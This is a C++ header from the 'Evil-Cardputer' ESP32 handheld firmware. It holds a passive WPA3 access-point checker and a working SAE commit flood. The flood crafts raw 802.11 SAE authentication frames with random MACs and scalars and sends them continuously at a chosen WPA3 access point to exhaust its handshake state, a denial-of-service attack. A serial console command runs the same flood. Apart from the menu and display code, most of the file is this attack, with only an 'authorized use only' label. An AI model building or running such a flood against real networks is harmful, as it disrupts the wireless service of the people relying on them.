#pragma once
// ============================================================================
//  WPA3 / SAE toolkit for Evil-Cardputer
// ----------------------------------------------------------------------------
//  - Checker (passive): scans APs and labels each WPA3 / WPA2+WPA3 transition /
//    WPA2 / open from the beacon auth mode.
//  - SAE commit flood (active): sends SAE (auth algorithm 3, seq 1 = commit)
//    authentication frames with random source MACs and random commit scalars to
//    a target AP, to exhaust its SAE state / anti-clogging handling. A DoS-class
//    management-frame attack, same family as the deauther. Authorized use only.
//
//  Relies on the ieee80211_raw_frame_sanity_check bypass in the main sketch and
//  on esp_wifi_80211_tx (WIFI_IF_STA).
// ============================================================================

namespace sae {

static const char* authmode_label(int m) {
    switch (m) {
        case WIFI_AUTH_OPEN:            return "OPEN";
        case WIFI_AUTH_WEP:             return "WEP";
        case WIFI_AUTH_WPA_PSK:         return "WPA";
        case WIFI_AUTH_WPA2_PSK:        return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-E";
        case WIFI_AUTH_WPA3_PSK:        return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/3";
        default:                        return "?";
    }
}

// ---- Checker: scan + classify ---------------------------------------------
inline void check_menu() {
    M5.Display.fillScreen(TFT_BLACK); M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
    M5.Display.setCursor(6, 40); M5.Display.println("Scanning APs..."); M5.Display.display();
    int nap = WiFi.scanNetworks(false, true);
    // Keep only WPA3 / WPA2+WPA3 transition APs
    int w3[64]; int nw = 0;
    for (int i = 0; i < nap && nw < 64; i++) {
        int am = WiFi.encryptionType(i);
        if (am == WIFI_AUTH_WPA3_PSK || am == WIFI_AUTH_WPA2_WPA3_PSK) w3[nw++] = i;
    }
    int top = 0; const int rowH = 17, headerY = 18, vis = 6; bool rd = true; enterDebounce();
    while (true) {
        if (rd) {
            M5.Display.fillScreen(TFT_BLACK);
            M5.Display.fillRect(0, 0, M5.Display.width(), 14, 0x0841); M5.Display.drawFastHLine(0, 14, M5.Display.width(), TFT_GREEN);
            M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_GREEN, 0x0841);
            char hd[24]; snprintf(hd, sizeof hd, "WPA3 APs  %d", nw);
            M5.Display.setCursor(6, 0); M5.Display.println(hd);
            if (nw <= 0) { M5.Display.setTextColor(TFT_ORANGE, TFT_BLACK); M5.Display.setCursor(6, 40); M5.Display.println("No WPA3 AP found"); }
            else for (int i = 0; i < vis && top + i < nw; i++) {
                int idx = w3[top + i]; int y = headerY + i * rowH;
                int am = WiFi.encryptionType(idx);
                M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
                M5.Display.setCursor(6, y + 1);
                M5.Display.printf("%-13.13s %s c%d", WiFi.SSID(idx).c_str(), authmode_label(am), WiFi.channel(idx));
            }
            M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK); M5.Display.setTextSize(1);
            M5.Display.setCursor(6, 122); M5.Display.println(";/. scroll  BACK exit");
            M5.Display.display(); rd = false;
        }
        M5.update(); cardUpdate();
        if (kp(KEY_BACKSPACE)) { keyRelease(); WiFi.scanDelete(); return; }
        if (kp(';')) { keyRelease(); if (top > 0) { top--; rd = true; } delay(90); }
        if (kp('.')) { keyRelease(); if (top + 1 < nw) { top++; rd = true; } delay(90); }
        delay(10);
    }
}

// ---- SAE commit flood ------------------------------------------------------
static int build_sae_commit(uint8_t* buf, const uint8_t* bssid, const uint8_t* src) {
    int n = 0;
    buf[n++] = 0xb0; buf[n++] = 0x00;                 // FC: auth
    buf[n++] = 0x3a; buf[n++] = 0x01;                 // duration
    memcpy(buf + n, bssid, 6); n += 6;                // DA = AP
    memcpy(buf + n, src, 6);   n += 6;                // SA = random
    memcpy(buf + n, bssid, 6); n += 6;                // BSSID = AP
    buf[n++] = 0x00; buf[n++] = 0x00;                 // seq ctrl
    buf[n++] = 0x03; buf[n++] = 0x00;                 // auth algorithm = 3 (SAE)
    buf[n++] = 0x01; buf[n++] = 0x00;                 // auth seq = 1 (commit)
    buf[n++] = 0x00; buf[n++] = 0x00;                 // status = 0
    buf[n++] = 0x13; buf[n++] = 0x00;                 // group id = 19 (ECP P-256)
    for (int i = 0; i < 32; i++) buf[n++] = (uint8_t)esp_random();   // scalar (32)
    for (int i = 0; i < 64; i++) buf[n++] = (uint8_t)esp_random();   // element (64)
    return n;
}
static void sae_draw(const char* ssid, uint8_t ch, uint32_t sent, bool running) {
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.fillRect(0, 0, M5.Display.width(), 14, 0x0841); M5.Display.drawFastHLine(0, 14, M5.Display.width(), TFT_GREEN);
    M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_GREEN, 0x0841); M5.Display.setCursor(6, 0); M5.Display.println("SAE Flood");
    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK); M5.Display.setCursor(6, 24); M5.Display.printf("%.18s c%d", ssid, ch);
    M5.Display.setTextColor(running ? TFT_RED : menuTextUnFocusedColor, TFT_BLACK); M5.Display.setCursor(6, 52); M5.Display.println(running ? "[ FLOODING ]" : "[ stopped ]");
    M5.Display.setTextColor(TFT_GREEN, TFT_BLACK); M5.Display.setCursor(6, 76); M5.Display.printf("commits: %lu", (unsigned long)sent);
    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK); M5.Display.setTextSize(1); M5.Display.setCursor(6, 122); M5.Display.println("ENTER start/stop  BACK exit");
    M5.Display.display();
}
static void flood(const uint8_t* bssid, const char* ssid, uint8_t ch) {
    WiFi.mode(WIFI_STA); WiFi.disconnect(); esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    bool running = false; uint32_t sent = 0, lastDraw = 0;
    uint8_t frame[160]; uint8_t src[6] = {0x02,0,0,0,0,0};
    sae_draw(ssid, ch, 0, false); enterDebounce();
    while (true) {
        M5.update(); cardUpdate();
        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
        if (kp(KEY_ENTER)) { keyRelease(); running = !running; sae_draw(ssid, ch, sent, running); }
        if (running) {
            for (int b = 0; b < 8; b++) {
                for (int i = 1; i < 6; i++) src[i] = (uint8_t)esp_random();   // random SA per commit
                int flen = build_sae_commit(frame, bssid, src);
                esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false); sent++;
            }
            if (millis() - lastDraw > 300) { lastDraw = millis(); sae_draw(ssid, ch, sent, running); }
            delay(4);
        } else delay(15);
    }
}
inline void flood_menu() {
    M5.Display.fillScreen(TFT_BLACK); M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
    M5.Display.setCursor(6, 40); M5.Display.println("Scanning APs..."); M5.Display.display();
    int nap = WiFi.scanNetworks(false, true);
    // Only WPA3 / WPA2+WPA3 APs can be SAE-flooded
    int w3[64]; int nw = 0;
    for (int i = 0; i < nap && nw < 64; i++) {
        int am = WiFi.encryptionType(i);
        if (am == WIFI_AUTH_WPA3_PSK || am == WIFI_AUTH_WPA2_WPA3_PSK) w3[nw++] = i;
    }
    if (nw <= 0) {
        M5.Display.fillScreen(TFT_BLACK); M5.Display.setTextColor(TFT_ORANGE, TFT_BLACK);
        M5.Display.setCursor(6, 50); M5.Display.println("No WPA3 AP found"); M5.Display.display();
        delay(1500); WiFi.scanDelete(); return;
    }
    int sel = 0, top = 0; const int rowH = 17, headerY = 18, vis = 6; bool rd = true; enterDebounce();
    while (true) {
        if (rd) {
            M5.Display.fillScreen(TFT_BLACK);
            M5.Display.fillRect(0, 0, M5.Display.width(), 14, 0x0841); M5.Display.drawFastHLine(0, 14, M5.Display.width(), TFT_GREEN);
            M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_GREEN, 0x0841); M5.Display.setCursor(6, 0); M5.Display.println("SAE: pick WPA3 AP");
            for (int i = 0; i < vis && top + i < nw; i++) {
                int idx = w3[top + i]; int y = headerY + i * rowH;
                int am = WiFi.encryptionType(idx);
                if (top + i == sel) { M5.Display.fillRect(0, y, M5.Display.width(), rowH, menuSelectedBackgroundColor); M5.Display.setTextColor(menuTextFocusedColor); }
                else M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
                M5.Display.setCursor(6, y + 1); M5.Display.printf("%-12.12s %s c%d", WiFi.SSID(idx).c_str(), authmode_label(am), WiFi.channel(idx));
            }
            M5.Display.display(); rd = false;
        }
        M5.update(); cardUpdate();
        if (kp(KEY_BACKSPACE)) { keyRelease(); WiFi.scanDelete(); return; }
        if (kp(KEY_ENTER)) { keyRelease(); break; }
        if (kp(';')) { keyRelease(); if (sel > 0) sel--; if (sel < top) top = sel; rd = true; delay(90); }
        if (kp('.')) { keyRelease(); if (sel < nw - 1) sel++; if (sel >= top + vis) top = sel - vis + 1; rd = true; delay(90); }
        delay(10);
    }
    int pick = w3[sel];
    uint8_t bssid[6]; memcpy(bssid, WiFi.BSSID(pick), 6);
    String ssid = WiFi.SSID(pick); uint8_t ch = (uint8_t)WiFi.channel(pick);
    WiFi.scanDelete();
    flood(bssid, ssid.c_str(), ch);
}

inline void menu() {
    const char* items[] = { "WPA3 checker", "SAE commit flood", "About" };
    int sel = 0; bool rd = true; enterDebounce();
    while (true) {
        if (rd) {
            M5.Display.fillScreen(TFT_BLACK);
            M5.Display.fillRect(0, 0, M5.Display.width(), 14, 0x0841); M5.Display.drawFastHLine(0, 14, M5.Display.width(), TFT_GREEN);
            M5.Display.setTextSize(1.5); M5.Display.setTextColor(TFT_GREEN, 0x0841); M5.Display.setCursor(6, 0); M5.Display.println("WPA3 / SAE");
            for (int i = 0; i < 3; i++) { int y = 24 + i * 20;
                if (i == sel) { M5.Display.fillRect(0, y - 1, M5.Display.width(), 18, menuSelectedBackgroundColor); M5.Display.setTextColor(menuTextFocusedColor); }
                else M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
                M5.Display.setCursor(8, y); M5.Display.println(items[i]); }
            M5.Display.display(); rd = false;
        }
        M5.update(); cardUpdate();
        if (kp(KEY_BACKSPACE)) { keyRelease(); return; }
        if (kp(';')) { keyRelease(); sel = (sel + 2) % 3; rd = true; delay(90); }
        if (kp('.')) { keyRelease(); sel = (sel + 1) % 3; rd = true; delay(90); }
        if (kp(KEY_ENTER)) { keyRelease();
            if (sel == 0) check_menu();
            else if (sel == 1) flood_menu();
            else { M5.Display.fillScreen(TFT_BLACK); M5.Display.setTextSize(1.5); M5.Display.setTextColor(0x5AEB, TFT_BLACK);
                   M5.Display.setCursor(6, 30); M5.Display.println("Checker: passive"); M5.Display.setCursor(6, 54); M5.Display.println("Flood: SAE commit DoS"); M5.Display.setCursor(6, 78); M5.Display.println("authorized use only"); M5.Display.display();
                   enterDebounce(); while (true) { M5.update(); cardUpdate(); if (kp(KEY_ENTER) || kp(KEY_BACKSPACE)) { keyRelease(); break; } delay(12); } }
            rd = true;
        }
        delay(10);
    }
}

inline void console(String a) {
    a.trim();
    int sp = a.indexOf(' '); String sub = sp < 0 ? a : a.substring(0, sp);
    String arg = sp < 0 ? "" : a.substring(sp + 1); arg.trim();
    if (sub == "" || sub == "help") { Serial.println(F("sae check | sae flood <bssid> <ch>")); return; }
    if (sub == "check") {
        int nap = WiFi.scanNetworks(false, true);
        Serial.printf("%d APs:\n", nap);
        for (int i = 0; i < nap; i++) { int am = WiFi.encryptionType(i);
            Serial.printf("  %-20s %-7s c%d %ddBm\n", WiFi.SSID(i).c_str(), authmode_label(am), WiFi.channel(i), WiFi.RSSI(i)); }
        WiFi.scanDelete(); return;
    }
    if (sub == "flood") {
        int sp2 = arg.indexOf(' '); if (sp2 < 0) { Serial.println(F("usage: sae flood <bssid> <ch>")); return; }
        String bs = arg.substring(0, sp2); uint8_t ch = (uint8_t)arg.substring(sp2 + 1).toInt(); if (!ch) ch = 1;
        int b[6]; if (sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) != 6) { Serial.println(F("bad bssid")); return; }
        uint8_t bssid[6]; for (int i = 0; i < 6; i++) bssid[i] = (uint8_t)b[i];
        WiFi.mode(WIFI_STA); WiFi.disconnect(); esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        uint8_t frame[160], src[6] = {0x02,0,0,0,0,0}; uint32_t t0 = millis(), sent = 0;
        while (millis() - t0 < 5000) { for (int k = 0; k < 8; k++) { for (int i = 1; i < 6; i++) src[i] = (uint8_t)esp_random(); int fl = build_sae_commit(frame, bssid, src); esp_wifi_80211_tx(WIFI_IF_STA, frame, fl, false); sent++; } delay(4); }
        Serial.printf("sae flood: %lu commits on ch%d\n", (unsigned long)sent, ch); return;
    }
    Serial.println(F("unknown; try 'sae help'"));
}

} // namespace sae
